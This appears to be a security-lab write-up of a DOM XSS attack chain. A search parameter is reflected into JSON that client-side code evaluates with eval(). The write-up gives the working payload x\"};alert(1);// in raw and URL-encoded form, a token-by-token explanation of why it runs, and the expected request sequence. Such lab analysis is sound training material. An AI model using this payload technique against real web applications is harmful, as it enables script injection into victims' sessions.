# Attack Chain — eval() breakout from JSON string via backslash escape-shift

## The code (two halves)
Server (`GET /search-results?search=X` → JSON; escaper: `"`→`\"`, everything else raw):
```json
{"results":[…],"searchTerm":"ESC(X)"}
```
Client (`/resources/js/searchResults.js`, external):
```js
xhr.open("GET", path + window.location.search);   // path='search-results'
xhr.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {
        eval('var searchResultsObj = ' + this.responseText);   // SINK
        displaySearchResults(searchResultsObj);
    }
};
```

## Data flow
```
Victim URL   /?search=x%5C%22%7D%3Balert(1)%3B%2F%2F   (raw input: x\"};alert(1);//)
   │
   ▼
[SOURCE] page XHRs  search-results?search=<same query>   (client forwards location.search)
   │
   ▼
Server reflects into JSON string:  "searchTerm":"x\\"};alert(1);//"
   │  (my \" → \\" in stream; my } ; ( ) / raw)
   ▼
[SINK] eval('var searchResultsObj = {"results":[],"searchTerm":"x\\"};alert(1);//"}')
   │  tokenizes as:
   │    "x\\"              → string `x\`
   │    }                  → closes the object literal EARLY
   │    ;alert(1);         → STATEMENT position → FIRES
   │    //"}`              → comment eats the template tail
   ▼
[TRUST BOUNDARY CROSSED] attacker JS runs in page origin; object intact so
displaySearchResults() renders normally afterward (stealth: "0 search results for 'x\'")
   ▼
RESULT: alert(1) on crafted-URL load, page otherwise functional
```

## Why this exact shape (grammar-forced, not styled)
The template `"searchTerm":"S"}` admits exactly one terminator source: a `\\"` pair
(from input `\"`), since lone input quotes are escaped into string content. After
termination the stream sits in property-value position inside `{…}`, where:
- `;` is ILLEGAL (kills the `x\"-alert(1);//` variant: "Unexpected token ';'"),
- trailing `"` (template's) strands any open expression (kills comment-less variants),
- `//` eats the closing `}` too (kills comment-without-brace variants: "Unexpected end
  of input" — unclosed object).
The ONLY valid continuation: close the object YOURSELF with raw `}` (passes through
unescaped), promoting the rest to statement position, where `;CODE;` is legal and `//`
safely consumes the template tail. Hence `x\"};alert(1);//` is essentially FORCED.

## Expected response sequence (verified)
1. `GET /?search=<payload>` → 200 fixed page + inline `search('search-results')`.
2. Browser XHRs `search-results?search=<payload>` → 200 JSON with reflected bytes.
3. `eval()` executes injected statement; `displaySearchResults` renders 0 results.
4. Real-browser `alert(1)` → `is-solved` (first poll).